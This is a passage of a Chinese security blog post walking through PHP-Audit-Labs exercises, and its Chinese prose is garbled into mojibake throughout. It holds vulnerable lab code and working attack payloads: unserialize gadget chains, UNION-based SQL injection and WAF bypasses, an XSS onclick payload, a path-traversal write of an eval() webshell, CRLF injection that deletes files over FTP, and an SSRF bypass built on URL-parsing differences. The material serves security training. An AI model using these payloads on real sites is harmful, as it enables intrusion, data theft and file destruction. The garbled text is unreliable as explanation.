{            $this->__die("What do you do?");        }        $this->__close();    }    function __wakeup() {        foreach($this->args as $k => $v) {            $this->args[$k] = strtolower(trim(mysql_escape_string($v)));        }    }}class SoFun{    public $file='index.php';    function __destruct(){        if(!empty($this->file)) {            include $this->file;        }    }    function __wakeup(){    $this-> file='index.php';    }}if(isset($_GET["data"])) {    @unserialize($_GET["data"]);}else {    new HITCON("source", array());}?>``````php//config.php<?php    $db_host = 'localhost';    $db_name = 'test';    $db_user = 'root';    $db_pass = '123';$DEBUG = 'xx';?>``````php// flag.php<?php!defined('IN_FLAG') && exit('Access Denied');echo "flag{un3eri@liz3_i3_s0_fun}";?> ```å…ˆä»ç®€å•çš„çœ‹èµ·,é¦–å…ˆæ˜¯SoFunç±»ã€‚æ˜¾ç„¶ç»•è¿‡wakeupå³å¯includeå¯æ§æ•°æ®flag.phpã€‚ä½†æ˜¯éœ€è¦æ³¨æ„flag.phpé™åˆ¶äº†å¿…é¡»`defined('IN_FLAG')`ã€‚æ³¨æ„åˆ°HITCONç±»åˆ™æœ‰ä¸€ä¸ªè·Ÿå‰é¢ä¾‹å­ä¸€æ ·çš„loaddataã€‚é‚£å°±å¯ä»¥ç”¨ç›¸åŒæ–¹æ³•ç»•è¿‡æ‰§è¡Œååºåˆ—åŒ–ã€‚HITCONç±»loginæ–¹æ³•æ˜¾ç„¶å­˜åœ¨sqlæ³¨å…¥,ä¸”loaddataå°±æ˜¯åœ¨è¿™é‡Œè¢«è°ƒç”¨çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬éœ€è¦è®©loaddataä¼ å…¥çš„æ•°æ®ä¸ºSoFunç±»çš„æ–‡ä»¶åŒ…å«åºåˆ—åŒ–æ•°æ®ã€‚è€Œè¿™ä¸€æ•°æ®æ¥è‡ª`$obj->role`.`$obj`æ˜¯sqlè¯­å¥çš„è¿”å›ç»“æœã€‚è€Œsqlè¡¨ç»“æ„ä¸­ç¬¬ä¸‰ä¸ªå­—æ®µroleæ­£æ˜¯æˆ‘ä»¬éœ€è¦çš„ã€‚é‚£ä¹ˆåªè¦åˆ©ç”¨è¿™ä¸ªsqlæ³¨å…¥è¿›è¡ŒunionæŸ¥è¯¢å°±è¾¾æˆ`$obj->role`å¯æ§ã€‚ç”±äºææ„å‡½æ•°ä¸­å¯ä»¥æ§åˆ¶æˆ‘ä»¬è°ƒç”¨çš„æ–¹æ³•åŠå‚æ•°ã€‚æ‰€ä»¥ä»¥ä¸Šæ€è·¯å¯ä»¥æ‰§è¡Œã€‚æœ€åæ³¨æ„çš„æ˜¯ã€‚HITCONç±»çš„wakeupä¼šå¯¹sqlè¯­å¥è¿›è¡Œè½¬ä¹‰ã€‚æ‰€ä»¥æˆ‘ä»¬ç”¨åŒæ ·çš„æ–¹æ³•ç»•è¿‡wakeupå³å¯`O:6:"HITCON":3:{s:6:"method";s:5:"login";s:4:"args";a:2:{s:8:"username";s:81:"1' union select 1,2,'a:1:{s:2:"xx";O:%2b5:"SoFun":2:{s:4:"file";s:8:"flag.php";}}&#39;%23&quot;;s:8:&quot;password&quot;;s:3:&quot;234&quot;;}}`## Day12###  htmlentities()å¤„ç†ä¸å…¨![](13.png)è¿™é‡Œçš„ä»£ç å­˜åœ¨ä¸€ä¸ªxssæ”»å‡».è¾“å‡ºç‚¹åœ¨ä¸€ä¸ªaæ ‡ç­¾ã€‚åŒæ—¶è¾“å‡ºæ—¶ç»è¿‡äº†ä¸€æ¬¡htmlentities.ä¸è¿‡è¿™ä¸ªå‡½æ•°`htmlentities()`å¹¶ä¸èƒ½è½¬æ¢æ‰€æœ‰çš„ç‰¹æ®Šå­—ç¬¦ï¼Œæ˜¯è½¬æ¢é™¤äº†ç©ºæ ¼ä¹‹å¤–çš„ç‰¹æ®Šå­—ç¬¦ï¼Œä¸”å•å¼•å·å’ŒåŒå¼•å·éœ€è¦å•ç‹¬æ§åˆ¶æ­¤å¤„é»˜è®¤å€¼çš„è¯æ˜¯ä¸ä¼šè½¬ä¹‰å•å¼•å·çš„ã€‚åŒæ—¶å‰é¢åœ¨å˜é‡è¦†ç›–æ—¶ä¼ å…¥çš„å˜é‡åªå¯¹`$value` è¿›è¡Œç±»å‹è½¬æ¢ï¼Œå¼ºåˆ¶å˜æˆintç±»å‹ã€‚ä½†æ˜¯è¿™éƒ¨åˆ†ä»£ç åªå¤„ç†äº† `$value` å˜é‡ï¼Œæ²¡é’ˆå¯¹ `$key` å˜é‡è¿›è¡Œå¤„ç†æ‰€ä»¥payloadæ˜¯`/?a&#39;onclick%3dalert(1)%2f%2f=c`ç»•è¿‡intvalçš„åŒæ—¶æ‰§è¡Œäº†aæ ‡ç­¾çš„onclikäº‹ä»¶,è¾¾æˆxss.### ç»ƒä¹ ```php&lt;?phprequire &#39;db.inc.php&#39;;if(isset($_REQUEST[&#39;username&#39;])){    if(preg_match(&quot;/(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i&quot;, $_REQUEST[&#39;username&#39;])){        die(&quot;Attack detected!!!&quot;);    }}if(isset($_REQUEST[&#39;password&#39;])){    if(preg_match(&quot;/(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i&quot;, $_REQUEST[&#39;password&#39;])){        die(&quot;Attack detected!!!&quot;);    }}function clean($str){    if(get_magic_quotes_gpc()){        $str=stripslashes($str);    }    return htmlentities($str, ENT_QUOTES);}$username = @clean((string)$_GET[&#39;username&#39;]);$password = @clean((string)$_GET[&#39;password&#39;]);$query=&#39;SELECT * FROM ctf.users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;&#39;;#echo $query;$result=mysql_query($query);while($row = mysql_fetch_array($result)){    echo &quot;&lt;tr&gt;&quot;;    echo &quot;&lt;td&gt;&quot; . $row[&#39;name&#39;] . &quot;&lt;/td&gt;&quot;;    echo &quot;&lt;/tr&gt;&quot;;}?&gt;</EOF></pre></center></tr></EOF></code></pre><p>è¿™é‡Œé¦–å…ˆè¦è¾¾æˆsqlæ³¨å…¥,è‡ªç„¶æ¯”è¾ƒå…³å¿ƒæ˜¯å¦èƒ½é—­åˆå•å¼•å·ã€‚ä½†æ˜¯æ³¨æ„åˆ°,æ­¤å¤„çš„htmlentitiesä¸¥æ ¼è½¬ä¹‰äº†å•åŒå¼•å·ã€‚ä¸èƒ½è¿›è¡Œé—­åˆã€‚</p><p>ä½†æ˜¯ä¸ç”¨å¼•å·é—­åˆçš„å¦å¤–çš„åŠæ³•å°±æ˜¯éå¸¸å¸¸è§çš„<code>\</code>è¿›è¡Œè½¬ä¹‰ã€‚è¿™æ ·passwordçš„å€¼å°±å˜æˆå¯æ§çš„æ³¨å…¥ä½ç½®äº†ã€‚</p><p>æ¥ä¸‹æ¥æ¯”è¾ƒå…³å¿ƒçš„æ˜¯ä»£ç ä¸­å¯¹usernameä¸passwordå…³é”®å­—çš„è¿‡æ»¤ã€‚è¿™é‡Œè¿‡æ»¤å¾ˆç®€å•,å…¶ä»–ç›²æ³¨ä¹‹ç±»çš„æ–¹æ³•å½“ç„¶å¯ä»¥åšåˆ°ã€‚ä¸è¿‡è¿™é‡Œå¯ä»¥ç”¨åˆ°ä¸€ä¸ªå®¹æ˜“è¢«å¿˜è®°çš„å°æŠ€å·§:</p><blockquote><p>php.iniä¸­é»˜è®¤<br>å¦‚æœä»¥ POST ã€ GET æ–¹å¼ä¼ å…¥ç›¸åŒçš„å˜é‡ï¼Œé‚£ä¹ˆç”¨ REQUEST è·å–è¯¥å˜é‡çš„å€¼å°†ä¸º POST è¯¥å˜é‡çš„å€¼</p></blockquote><p>æ‰€ä»¥postæ•°æ®ä¼šè¦†ç›–æ‰getçš„æ•°æ®ã€‚æˆ‘ä»¬ç”¨postä¼ æ­£å¸¸çš„payloadã€å†ç”¨getæ‰§è¡Œsqlè¯­å¥å³å¯</p><pre><code>get:username=\&amp;password=union select 1,flag,3,4 from ctf.users%23post: username=1&amp;password=2</code></pre><h2 id="Day13"><a href="#Day13" class="headerlink" title="Day13"></a>Day13</h2><h3 id="wafå¤±æ•ˆè¿›è¡Œsqlæ³¨å…¥"><a href="#wafå¤±æ•ˆè¿›è¡Œsqlæ³¨å…¥" class="headerlink" title="wafå¤±æ•ˆè¿›è¡Œsqlæ³¨å…¥"></a>wafå¤±æ•ˆè¿›è¡Œsqlæ³¨å…¥</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/14.png" class="lazyload" data-srcset="14.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æœ¬é¢˜æ˜¾ç„¶ä»£ç ä¸­å­˜åœ¨sqlè¯­å¥æ‹¼æ¥ã€‚ä½†æ˜¯åªæœ‰ä¸€ä¸ªaddslashes,é™¤éæ˜¯äºŒæ¬¡æ³¨å…¥å¦åˆ™ä¸èƒ½åˆ©ç”¨ã€‚<br>ç„¶è€Œä»£ç ä¸­å´å‡ºç°äº†å¾ˆå¼±æ™ºçš„æ£€æŸ¥<code>substr()</code>,å…¶é•¿åº¦è¢«å®šæ­»ä¸º20.é‚£ä¹ˆæˆ‘ä»¬åªè¦å¡åœ¨è¿™ä¸ªç‚¹ä½¿ç”¨å•å¼•å·å°±èƒ½å¯¼è‡´è½¬ä¹‰å¤±æ•ˆäº†</p><pre><code>user=1234567890123456789&#39;&amp;passwd=or 1=1#</code></pre><p>åœ¨æŸCMSä¸­,å¯¹sqlè¯­å¥è¿›è¡Œäº†htmlentiteså¤„ç†ã€‚ä½†æ˜¯åŒæ—¶æ•°æ®åœ¨ä¼ å…¥å‰ä¼šè¿›è¡Œä¸€æ¬¡urldecodeã€‚æˆ‘ä»¬çŸ¥é“,åœ¨wafæ£€æµ‹åå†è¿›è¡Œè§£ç æ“ä½œæ— ç–‘æ˜¯å…·æœ‰å±å®³æ€§çš„ã€‚(æ¯”å¦‚json_deocdeå¦‚æœåœ¨wafæ£€æµ‹ä¹‹åçš„è¯,å°±èƒ½ç”¨unicodeç»•è¿‡ä»»æ„å­—ç¬¦waf)</p><h3 id="ç»ƒä¹ -8"><a href="#ç»ƒä¹ -8" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><pre><code class="php">//index.php&lt;?phprequire &#39;db.inc.php&#39;;  function dhtmlspecialchars($string) {      if (is_array($string)) {          foreach ($string as $key =&gt; $val) {              $string[$key] = dhtmlspecialchars($val);          }      }      else {          $string = str_replace(array(&#39;&amp;&#39;, &#39;&quot;&#39;, &#39;&lt;&#39;, &#39;&gt;&#39;, &#39;(&#39;, &#39;)&#39;), array(&#39;&amp;amp;&#39;, &#39;&amp;quot;&#39;, &#39;&amp;lt;&#39;, &#39;&amp;gt;&#39;, &#39;ï¼ˆ&#39;, &#39;ï¼‰&#39;), $string);          if (strpos($string, &#39;&amp;amp;#&#39;) !== false) {              $string = preg_replace(&#39;/&amp;amp;((#(\d{3,5}|x[a-fA-F0-9]{4}));)/&#39;, &#39;&amp;\\1&#39;, $string);          }      }      return $string;  }  function dowith_sql($str) {      $check = preg_match(&#39;/select|insert|update|delete|\&#39;|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/is&#39;, $str);      if ($check) {          echo &quot;éæ³•å­—ç¬¦!&quot;;          exit();      }      return $str;  }  // ç»è¿‡ç¬¬ä¸€ä¸ªwafå¤„ç†  foreach ($_REQUEST as $key =&gt; $value) {      $_REQUEST[$key] = dowith_sql($value);  }  // ç»è¿‡ç¬¬äºŒä¸ªWAFå¤„ç†  $request_uri = explode(&quot;?&quot;, $_SERVER[&#39;REQUEST_URI&#39;]);  if (isset($request_uri[1])) {      $rewrite_url = explode(&quot;&amp;&quot;, $request_uri[1]);      foreach ($rewrite_url as $key =&gt; $value) {          $_value = explode(&quot;=&quot;, $value);          if (isset($_value[1])) {              $_REQUEST[$_value[0]] = dhtmlspecialchars(addslashes($_value[1]));          }      }  }  // ä¸šåŠ¡å¤„ç†  if (isset($_REQUEST[&#39;submit&#39;])) {      $user_id = $_REQUEST[&#39;i_d&#39;];      $sql = &quot;select * from ctf.users where id=$user_id&quot;;      $result=mysql_query($sql);      while($row = mysql_fetch_array($result))      {          echo &quot;&lt;tr&gt;&quot;;          echo &quot;&lt;td&gt;&quot; . $row[&#39;name&#39;] . &quot;&lt;/td&gt;&quot;;          echo &quot;&lt;/tr&gt;&quot;;      }  }?&gt;</code></pre><p>è¿™ä¸ªç»ƒä¹ å¾ˆæœ‰è¥å…»ã€‚ç”¨åˆ°äº†å‡ ä¸ªphpçš„ç‰¹æ€§<br>1.ä¼ å…¥çš„éæ³•çš„ <code>$_GET</code> æ•°ç»„å‚æ•°å,PHPä¼šå°†ä»–ä»¬æ›¿æ¢æˆä¸‹åˆ’çº¿<br>2.ä¼ å…¥å¤šä¸ªç›¸åŒå‚æ•°æ—¶,phpåªä¼šæ¥å—æœ€åä¸€ä¸ª(ç±»ä¼¼jsäº†)<br>3.<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>æ–¹å¼è·å¾—çš„å‚æ•°ï¼Œå¹¶ä¸ä¼šå¯¹å‚æ•°ä¸­çš„æŸäº›ç‰¹æ®Šå­—ç¬¦è¿›è¡Œæ›¿æ¢</p><p>æœ¬é¢˜ä»£ç ä¸­,<code>$_REQUEST</code>çš„æ•°æ®ä¼šç»è¿‡<code>dowith_sql</code>å¤„ç†ã€‚è€Œä¹‹åç¬¬äºŒä¸ªwafä¼šå¯¹<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>è¿›è¡Œ<code>dhtmlspecialchars()</code>å¤„ç†.</p><p>é‚£ä¹ˆæ­¤å¤„æ€è·¯å¦‚ä¸‹,ä½¿ç”¨payload<br><code>i_d=padyload&amp;i.d=123</code><br>ç»è¿‡ç¬¬ä¸€æ¬¡wafæ—¶ï¼Œphpä¼šå°†å‚æ•°ä¸­çš„æŸäº›ç‰¹æ®Šç¬¦å·æ›¿æ¢ä¸ºä¸‹åˆ’çº¿ã€‚å› æ­¤ä¾¿å¾—åˆ°äº†ä¸¤ä¸ªi_d,å…¶ä¸­ä¸å«æ¶æ„ä»£ç çš„<code>i_d</code>å†…å®¹é€šè¿‡æ£€æŸ¥ã€‚<br>ç»è¿‡ç¬¬äºŒæ¬¡wafæ—¶,ç”±äºä»£ç æ˜¯é€šè¿‡ $_SERVER[â€˜REQUEST_URIâ€™] å–å‚æ•°.æ£€æŸ¥çš„å®é™…ä¸Šæ˜¯æˆ‘ä»¬åˆå§‹ä¼ å…¥çš„payloadã€‚è¿™é‡Œç”±äºæ˜¯æ•°å€¼å‹æ³¨å…¥,æ‰€ä»¥å¯ä»¥ç›´æ¥unionå¾—åˆ°flag</p><p>payload</p><pre><code>submit=&amp;i_d=-1/**/union/**/select/**/1,flag,3,4/**/from/**/ctf.users&amp;i.d=123</code></pre><h2 id="Day14"><a href="#Day14" class="headerlink" title="Day14"></a>Day14</h2><h3 id="å˜é‡è¦†ç›–-è·¯å¾„ç©¿è¶Š"><a href="#å˜é‡è¦†ç›–-è·¯å¾„ç©¿è¶Š" class="headerlink" title="å˜é‡è¦†ç›–+è·¯å¾„ç©¿è¶Š"></a>å˜é‡è¦†ç›–+è·¯å¾„ç©¿è¶Š</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/15.png" class="lazyload" data-srcset="15.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™é‡Œçš„ä»£ç åœ¨ææ„å‡½æ•°é‡Œæœ‰å†™æ–‡ä»¶çš„æ–¹æ³•ã€‚å› æ­¤åªè¦idå¯æ§å°±èƒ½æ§åˆ¶è·¯å¾„ã€‚åŒæ—¶çœ‹åˆ°æ„é€ å‡½æ•°é‡Œå­˜åœ¨å˜é‡è¦†ç›–ï¼Œé‚£ä¹ˆåˆ©ç”¨èµ·æ¥å°±ä¸éš¾äº†ã€‚<br>payload</p><pre><code>id=../var/www/html/shell.php&amp;shell=&#39;,)%0a&lt;?=eval($_REQUEST[byc]);?&gt;//</code></pre><p>å› ä¸ºå®é™…ä¸Šå†™å…¥çš„å†…å®¹æ˜¯ï¼š</p><pre><code>array(    &#39;id&#39;=&gt;&#39;../var/www/html/shell.php&#39;,    &#39;lost&#39;=&gt;0,    &#39;bought&#39;=&gt;0,    &#39;shell&#39;=&gt;&#39;\&#39;,)    &lt;?=eval($_REQUEST[byc]);?&gt;//&#39;,)</code></pre><p>æ‰€ä»¥éœ€è¦å…ˆé—­åˆ,æ¢è¡Œåå†™shellæ³¨é‡Šå³å¯ã€‚</p><p>æŸCMSä¸­ä¹Ÿå‡ºç°äº†ç±»ä¼¼çš„å˜é‡è¦†ç›–æ¼æ´ã€‚æ¯”å¦‚éœ€è¦adminæƒé™,è€Œadminæƒé™æ˜¯ç”±sessionæ•°ç»„çš„å€¼å†³å®šçš„ã€‚å› æ­¤å¯ä»¥ç›´æ¥<code>_SESSION[duomi_group_]=1&amp;_SESSION[duomi_admin_]=1</code>è¦†ç›–ã€‚<br>å½“ç„¶,å‰ææ˜¯å½“å‰çš„phpå¼€å¯äº†<code>session_start()</code></p><h2 id="Day15"><a href="#Day15" class="headerlink" title="Day15"></a>Day15</h2><h3 id="PHP-SELF"><a href="#PHP-SELF" class="headerlink" title="PHP_SELF"></a>PHP_SELF</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/16.png" class="lazyload" data-srcset="16.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å…³äº<code>$_SERVER[&#39;PHP&#39;]</code>:<br><code>PHP_SELF</code>æŒ‡å½“å‰çš„é¡µé¢ç»å¯¹åœ°å€,å®ƒæ˜¯å¯ä»¥æ§åˆ¶çš„.</p><p>åŒæ—¶ä»£ç ä¸­è°ƒç”¨äº†ä¸€æ¬¡urldecode,åŠ ä¸Šæµè§ˆå™¨è‡ªå¸¦çš„ä¸€æ¬¡è§£ç ,å°±å¯ä»¥é€šè¿‡äºŒæ¬¡urlç¼–ç è¿›è¡Œå…³é”®å­—ç»•è¿‡<br><code>http://www.test.com/index.php/http:%252f%252fblog.dyboy.cn?redirect=test&amp;params=test123</code><br>æ­¤å¤„payloadå³å¯è¾¾æˆ302è·³è½¬</p><p><code>PHP_SELF</code>è¿™ä¸ªè€ƒç‚¹ä¹‹å‰zer0ptsçš„é¢˜ç›®ä¸­ä¹Ÿæœ‰å‡ºç°è¿‡</p><h3 id="ç»ƒä¹ -9"><a href="#ç»ƒä¹ -9" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><pre><code class="php">// index.php&lt;?php include &quot;./config.php&quot;;include &quot;./flag.php&quot;;error_reporting(0);$black_list = &quot;/admin|guest|limit|by|substr|mid|like|or|char|union|select|greatest|%00|\&#39;|&quot;;$black_list .= &quot;=|_| |in|&lt;|&gt;|-|chal|_|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i&quot;;if(preg_match($black_list, $_GET[&#39;user&#39;])) exit(&quot;:P&quot;); if(preg_match($black_list, $_GET[&#39;pwd&#39;])) exit(&quot;:P&quot;); $query=&quot;select user from users where user=&#39;$_GET[user]&#39; and pwd=&#39;$_GET[pwd]&#39;&quot;;echo &quot;&lt;h1&gt;query : &lt;strong&gt;&lt;b&gt;{$query}&lt;/b&gt;&lt;/strong&gt;&lt;br&gt;&lt;/h1&gt;&quot;;$result = $conn-&gt;query($query);if($result-&gt;num_rows &gt; 0){    $row = $result-&gt;fetch_assoc();    if($row[&#39;user&#39;]) echo &quot;&lt;h2&gt;Welcome {$row[&#39;user&#39;]}&lt;/h2&gt;&quot;;}$result = $conn-&gt;query(&quot;select pwd from users where user=&#39;admin&#39;&quot;);if($result-&gt;num_rows &gt; 0){    $row = $result-&gt;fetch_assoc();    $admin_pass = $row[&#39;pwd&#39;];}if(($admin_pass)&amp;&amp;($admin_pass === $_GET[&#39;pwd&#39;])){    echo $flag;}highlight_file(__FILE__);?&gt;</code></pre><p>æ²¡å•¥æ„æ€â€¦è·Ÿä¹‹å‰æ ¡èµ›çš„å¥—è·¯é¢˜ä¸€æ ·çš„ã€‚<code>regexp</code>è¿›è¡Œæ³¨å…¥<code>;%00</code>æ¥æ³¨é‡Šã€‚</p><h2 id="Day16"><a href="#Day16" class="headerlink" title="Day16"></a>Day16</h2><h3 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/17.png" class="lazyload" data-srcset="17.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æœ¬é¢˜ä¸»è¦æ˜¯ä¸€ä¸ª<code>$_REQUEST</code>çš„ä¾‹å­ã€‚ä»é¢˜ç›®é€»è¾‘ä¸Šçœ‹,é¦–å…ˆå¯ä»¥çŸ¥é“æ˜¯è¿›è¡Œäº†ä¸€æ¬¡ftpçš„è¿æ¥,åŒæ—¶ç”¨<code>intval</code>æ¥è¯•å›¾å¤„ç†æˆ‘ä»¬çš„è¾“å…¥ã€‚çœ‹ä¼¼æ— æ³•ç»•è¿‡ã€‚ä½†æ˜¯å®é™…è¾“å‡ºä¸‹å°±ä¼šå‘ç°æœ‰è¹Šè··: <code>$_REQUEST</code>çš„å†…å®¹ä¸å—è¿‡æ»¤å‡½æ•°å½±å“ã€‚æ‰€ä»¥è™½ç„¶<code>$_REQUEST</code> å†…å®¹æ˜¯ä¸Šè¿°ä¸‰ä¸ªå…¨å±€å˜é‡çš„åˆé›†,ä½†å®é™…ä¸Šæ˜¯ä¸ä¼šå—å½±å“çš„ã€‚</p><p>payload</p><pre><code>?mode=1%0a%0dDELETE%20test.file</code></pre><p>1å¯ä»¥è¾¾æˆmodeçš„åˆ¤æ–­ã€‚è€Œåç»­çš„æ•°æ®é€šè¿‡crlfè¢«å½“åšå‘½ä»¤æ‰§è¡Œã€‚åˆ é™¤äº†æ–‡ä»¶ã€‚</p><p>å› æ­¤,éœ€è¦æ³¨æ„<code>$_REQUEST</code>çš„ä½¿ç”¨ã€‚å‡å¦‚åªå¯¹<code>GET,POST,COOKIE</code>ä¸‰ç§è¿›è¡Œè¿‡æ»¤å´åœ¨ä»£ç ä¸­æ‹¼æ¥<code>REQUEST</code>æ˜¯ä¸å¯å–çš„ã€‚</p><h3 id="ç»ƒä¹ -10"><a href="#ç»ƒä¹ -10" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><pre><code class="php">// index.php&lt;?phpfunction check_inner_ip($url){    $match_result=preg_match(&#39;/^(http|https)?:\/\/.*(\/)?.*$/&#39;,$url);    if (!$match_result){        die(&#39;url fomat error1&#39;);    }    try{        $url_parse=parse_url($url);    }    catch(Exception $e){        die(&#39;url fomat error2&#39;);    }    $hostname=$url_parse[&#39;host&#39;];    $ip=gethostbyname($hostname);    $int_ip=ip2long($ip);    return ip2long(&#39;127.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;10.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;172.16.0.0&#39;)&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long(&#39;192.168.0.0&#39;)&gt;&gt;16 == $int_ip&gt;&gt;16 || ip2long(&#39;0.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24;}function safe_request_url($url){    if (check_inner_ip($url)){        echo $url.&#39; is inner ip&#39;;    }    else{        $ch = curl_init();        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        curl_setopt($ch, CURLOPT_HEADER, 0);        $output = curl_exec($ch);        $result_info = curl_getinfo($ch);        if ($result_info[&#39;redirect_url&#39;]){            safe_request_url($result_info[&#39;redirect_url&#39;]);        }        curl_close($ch);        var_dump($output);    }}$url = $_POST[&#39;url&#39;];if(!empty($url)){    safe_request_url($url);}else{    highlight_file(__file__);}//flag in flag.php ?&gt;</code></pre><pre><code class="php">// flag.php&lt;?phpif (! function_exists(&#39;real_ip&#39;) ) {    function real_ip()    {        $ip = $_SERVER[&#39;REMOTE_ADDR&#39;];        if (is_null($ip) &amp;&amp; isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]) &amp;&amp; preg_match_all(&#39;#\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}#s&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;], $matches)) {            foreach ($matches[0] AS $xip) {                if (!preg_match(&#39;#^(10|172\.16|192\.168)\.#&#39;, $xip)) {                    $ip = $xip;                    break;                }            }        } elseif (is_null($ip) &amp;&amp; isset($_SERVER[&#39;HTTP_CLIENT_IP&#39;]) &amp;&amp; preg_match(&#39;/^([0-9]{1,3}\.){3}[0-9]{1,3}$/&#39;, $_SERVER[&#39;HTTP_CLIENT_IP&#39;])) {            $ip = $_SERVER[&#39;HTTP_CLIENT_IP&#39;];        } elseif (is_null($ip) &amp;&amp; isset($_SERVER[&#39;HTTP_CF_CONNECTING_IP&#39;]) &amp;&amp; preg_match(&#39;/^([0-9]{1,3}\.){3}[0-9]{1,3}$/&#39;, $_SERVER[&#39;HTTP_CF_CONNECTING_IP&#39;])) {            $ip = $_SERVER[&#39;HTTP_CF_CONNECTING_IP&#39;];        } elseif (is_null($ip) &amp;&amp; isset($_SERVER[&#39;HTTP_X_REAL_IP&#39;]) &amp;&amp; preg_match(&#39;/^([0-9]{1,3}\.){3}[0-9]{1,3}$/&#39;, $_SERVER[&#39;HTTP_X_REAL_IP&#39;])) {            $ip = $_SERVER[&#39;HTTP_X_REAL_IP&#39;];        }        return $ip;    }}$rip = real_ip();if($rip === &quot;127.0.0.1&quot;)    die(&quot;HRCTF{SSRF_can_give_you_flag}&quot;);else    die(&quot;You IP is {$rip} not 127.0.0.1&quot;);?&gt;</code></pre><p>è¿™ä¸ªåº”è¯¥å°±æ˜¯å½“åˆéƒå¸ˆå‚…ç»å…¸ssrfçš„åŸå‹äº†ã€‚è¦æ±‚ä»å†…ç½‘ip 127.0.0.1è®¿é—®flag.phpæ‰èƒ½å¾—åˆ°flag.ä½¿ç”¨çš„è‡ªç„¶æ˜¯å½“åˆblackhatpdfä¸­åˆ†äº«çš„å…³äºphpåŠcurlé—´å¯¹urlè§£æçš„å·®å¼‚</p><pre><code>url=http://foo@localhost:80@www.bycsec.top/flag.php</code></pre><p>libcurlè®¤ç¬¬ä¸€ä¸ª<code>@</code>åçš„ä½œä¸ºhostã€‚phpåŠå…¶ä»–è¯­è¨€éƒ½è®¤æœ€åä¸€ä¸ª<code>@</code>åçš„ä½œä¸ºhost.æ‰€ä»¥å‰é¢ç»•è¿‡å†…ç½‘ipé™åˆ¶ã€‚åœ¨åé¢æˆåŠŸæ‰§è¡Œäº†curl</p><h2 id="Day17"><a href="#Day17" class="headerlink" title="Day17"></a>Day17</h2><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/18.png" class="lazyload" data-srcset="18.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="md5-raw-output-true"><a href="#md5-raw-output-true" class="headerlink" title="md5 raw_output = true"></a>md5 raw_output = true</h2><p>è¿™å…¶å®æ˜¯ä¸€ä¸ªå¾ˆç»å…¸çš„æ¼æ´ =&gt; å¦‚æœæåˆ° ffifdyopåº”è¯¥å°±å¾ˆç†Ÿæ‚‰äº†ã€‚ä¼ è¯´ä¸­çš„ä¸‡èƒ½å¯†ç ç»•è¿‡ã€‚ è€Œä¹‹æ‰€ä»¥å­˜åœ¨è¿™ä¸ªç»•è¿‡çš„åŸå› 